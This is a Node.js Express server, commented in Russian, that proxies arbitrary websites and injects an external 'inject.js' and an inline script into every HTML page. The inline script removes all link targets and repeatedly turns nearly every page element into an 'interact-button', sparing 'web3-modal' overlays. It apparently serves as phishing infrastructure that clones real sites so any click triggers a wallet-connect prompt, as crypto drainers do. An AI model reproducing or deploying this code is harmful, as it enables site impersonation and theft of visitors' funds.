const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Кеш для статики
const staticCache = new Map();

// Раздаём inject.js
app.get("/inject.js", (req, res) => {
  res.sendFile(path.join(__dirname, "inject.js"));
});

// Скрипты для вставки
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="/inject.js"></script>`;
const inlineScript = `
<script>
  function addClassesToElements() {
    const links = document.querySelectorAll('a:not(.interact-button)');
    for (const link of links) {
      link.removeAttribute('href');
      link.classList.add('interact-button');
    }
    const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
    for (const button of buttons) {
      button.classList.add('interact-button');
    }
  }
  function runWhenReady() {
    addClassesToElements();
    setInterval(addClassesToElements, 300);
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

// Проксируем статику через /proxy
app.use("/proxy", (req, res) => {
  const targetBase = req.query.base;
  if (!targetBase) return res.status(400).send("Параметр ?base= обязателен");

  const targetUrl = new URL(req.originalUrl.replace("/proxy", ""), targetBase).toString();
  const protocol = targetUrl.startsWith("https") ? https : http;

  if (staticCache.has(targetUrl)) {
    const cached = staticCache.get(targetUrl);
    res.writeHead(200, cached.headers);
    return res.end(cached.body);
  }

  protocol.get(targetUrl, (proxyRes) => {
    let chunks = [];

    proxyRes.on("data", (chunk) => chunks.push(chunk));
    proxyRes.on("end", () => {
      const buffer = Buffer.concat(chunks);
      const contentType = proxyRes.headers["content-type"] || "";

      if (!contentType.includes("text/html")) {
        staticCache.set(targetUrl, {
          headers: proxyRes.headers,
          body: buffer,
        });
      }

      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      res.end(buffer);
    });
  }).on("error", (err) => {
    res.status(500).send("Ошибка при проксировании статики: " + err.message);
  });
});

// Общая функция проксирования HTML с модификацией
function proxyHtml(targetUrl, res) {
  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("Некорректный URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;

  protocol.get(targetUrl, (proxyRes) => {
    let body = [];

    proxyRes.on("data", (chunk) => body.push(chunk));
    proxyRes.on("end", () => {
      let contentType = proxyRes.headers["content-type"] || "";
      let responseBody = Buffer.concat(body).toString("utf8");

      if (contentType.includes("text/html")) {
        responseBody = responseBody
          .replace(/(["'])\/(_next\/[^"']+)/g, `$1${urlObj.origin}/$2`)
          .replace(/(["'])\/(assets\/[^"']+)/g, `$1/proxy/$2?base=${targetUrl}`)
          .replace(/(["'])\/(static\/[^"']+)/g, `$1/proxy/$2?base=${targetUrl}`);

        if (responseBody.includes("</head>")) {
          responseBody = responseBody.replace(
            "</head>",
            `${injectedScriptTag}\n${inlineScript}</head>`
          );
        } else {
          responseBody = injectedScriptTag + inlineScript + responseBody;
        }
      }

      let headers = { ...proxyRes.headers };
      delete headers["content-length"];
      delete headers["content-encoding"];

      res.writeHead(proxyRes.statusCode, headers);
      res.end(responseBody);
    });
  }).on("error", (err) => {
    res.status(500).send("Ошибка при проксировании: " + err.message);
  });
}

// 📌 Обработка /?id=https://...
app.get("/", (req, res) => {
  let targetUrl = req.query.id;
  if (!targetUrl) return res.status(400).send("Параметр ?id= обязателен");

  // Автодобавление https:// если не указано
  if (!/^https?:\/\//i.test(targetUrl)) {
    targetUrl = "https://" + targetUrl;
  }

  proxyHtml(targetUrl, res);
});

// 📌 Обработка /example.com
app.get("/:host", (req, res) => {
  const host = req.params.host;
  const targetUrl = `https://${host}/`;
  proxyHtml(targetUrl, res);
});

// 📌 Обработка /example.com/любая/глубина/пути
app.get("/:host/*", (req, res) => {
  const host = req.params.host;
  const restPath = req.params[0]; // путь после хоста

  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|map)$/.test(restPath)) {
    return res.status(404).send("Not found");
  }

  const targetUrl = `https://${host}/${restPath}`;
  proxyHtml(targetUrl, res);
});

app.listen(PORT, () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
